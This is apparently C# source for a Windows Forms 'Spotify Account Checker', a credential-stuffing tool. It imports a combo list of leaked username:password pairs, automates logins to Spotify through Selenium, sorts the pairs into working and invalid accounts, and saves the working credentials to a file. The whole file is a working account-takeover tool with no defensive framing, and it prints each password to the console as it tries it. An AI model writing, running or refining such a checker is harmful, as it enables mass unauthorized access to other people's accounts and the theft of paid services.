using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Firefox;
using System.Runtime.InteropServices;
using System.Threading;
using OpenQA.Selenium.Remote;

namespace Spotify_Account_Checker
{
    public partial class Form1 : Form
    {
        //selenium webdriver
        
        ChromeOptions options = new ChromeOptions();
        IWebDriver driver = new ChromeDriver();
      
        public Form1()
        {
            InitializeComponent();

        }

     


        private void button1_Click(object sender, EventArgs e)
        {
            //Import combo list into listbox
            try
            {
                OpenFileDialog f = new OpenFileDialog();
                if (f.ShowDialog() == DialogResult.OK)
                {
                    listBox1.Items.Clear();
                    List<string> lines = new List<string>();
                    using (StreamReader r = new StreamReader(f.OpenFile()))
                    {
                        string line;
                        while ((line = r.ReadLine()) != null)
                        {
                            listBox1.Items.Add(line);
                        }
                    }

                }
                int i = listBox1.Items.Count;
                int progress = 0;
                label2.Text = "0" + "/" + i;
                progressBar1.Maximum = i;
                Console.WriteLine("Successfully Imported the list!");
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred when importing the list. '{0}'", ex);
            }
           
        }

        public async Task login(string user, string password)
        {
            //navigate to spotify login page
            Console.WriteLine("Loading Spotify Login Page");
            driver.Manage().Cookies.DeleteAllCookies();
            driver.Navigate().GoToUrl("https://accounts.spotify.com/en/login");
            Console.WriteLine("Waiting for page load...");
            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
            Console.WriteLine("Page successfully loaded!");
            Console.WriteLine("Begin check");
            Console.WriteLine("Sending " + user + " to browser");
            driver.FindElement(By.Id("login-username")).Clear();
            driver.FindElement(By.Id("login-username")).SendKeys(user);
            Thread.Sleep(200);
            Console.WriteLine("Sending " + password + " to browser");
            driver.FindElement(By.Id("login-password")).Clear();
            driver.FindElement(By.Id("login-password")).SendKeys(password);
            Thread.Sleep(200);
            Console.WriteLine("Submitting Login...");
            driver.FindElement(By.Id("login-password")).SendKeys(OpenQA.Selenium.Keys.Enter);
            Thread.Sleep(1000);
            Console.WriteLine("Waiting for page load...");
            driver.Manage().Timeouts().ImplicitlyWait(TimeSpan.FromSeconds(30));
            Console.WriteLine("Page loaded, checking if successfull");
            


        }

       
        public async Task<bool?> check_()
        {
           
                IWebElement body = driver.FindElement(By.TagName("body"));
                if (body.Text.Contains("Incorrect"))
                {
                    return false;
                }
                else if (body.Text.Contains("logged"))
                {
                    return true;
                }
                else
                {
                    return null;

                }
            
           
        }

    


        private async void button2_Click(object sender, EventArgs e)
        {
            int i = listBox1.Items.Count;
            int progress = 0;
            label2.Text = "0" + "/" + i;
            progressBar1.Maximum = i;
            int retries = 0;
            foreach (string item in listBox1.Items)
            {
            code_start:
                string[] user = item.Split(new String[] { ":" }, StringSplitOptions.None);
                label5.Text = user[0];
                label6.Text = user[1];
                //check if proxies is enabled


                Task task = Task.Run(() => login(user[0], user[1]));
                await task;



                Task<bool?> check = Task<bool?>.Run(() => check_());
                bool? working = await check;

                if (working == true)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine(user[0] + " " + user[1] + " is a working account");
                    Console.ResetColor();
                    listBox2.Items.Add(item);
                }
                else if (working == false)
                {
                    Console.ForegroundColor = ConsoleColor.DarkYellow;
                    Console.WriteLine(user[0] + " " + user[1] + "is not working");
                    Console.ResetColor();
                    listBox3.Items.Add(item);
                }
                else if (working == null)
                {

                    while (retries < 5)
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("Cannot Determine, Rechecking... (" + retries + ")");
                        Console.ResetColor();
                        retries = retries + 1;
                        goto code_start;

                    }
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Maximum retries reached. Assumming account is not valid.");
                    Console.ResetColor();
                    listBox3.Items.Add(item);


                }


                progress = progress + 1;
                progressBar1.Value = progress;
                label2.Text = progress + "/" + i;
                groupBox2.Text = "Working " + "(" + listBox2.Items.Count + ")";
                groupBox3.Text = " Not Working " + "(" + listBox3.Items.Count + ")";

            }
            

            MessageBox.Show("Check Completed. Have found " + listBox2.Items.Count + " working accounts and " + listBox3.Items.Count + " invalid accounts");
            progressBar1.Value = 0;
            label2.Text = "0" + "/" + i;
            
        }

        public static void ShowConsoleWindow()
        {
            var handle = GetConsoleWindow();

            if (handle == IntPtr.Zero)
            {
                AllocConsole();
            }
            else
            {
                ShowWindow(handle, SW_SHOW);
            }
        }

        public static void HideConsoleWindow()
        {
            var handle = GetConsoleWindow();

            ShowWindow(handle, SW_HIDE);
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private void Form1_Load(object sender, EventArgs e)
        {
            ShowConsoleWindow();
            Console.WriteLine("Application Successfully Loaded!");
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            driver.Quit();
        }

        private void button5_Click(object sender, EventArgs e)
        {
            var saveFile = new SaveFileDialog();
            saveFile.Filter = "Text (*.txt)|*.txt";
            if (saveFile.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                using (var sw = new StreamWriter(saveFile.FileName, false))
                    foreach (var item in listBox2.Items)
                        sw.Write(item.ToString() + Environment.NewLine);
                
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            listBox1.Items.Clear();
        }

       

    
    }
}
    

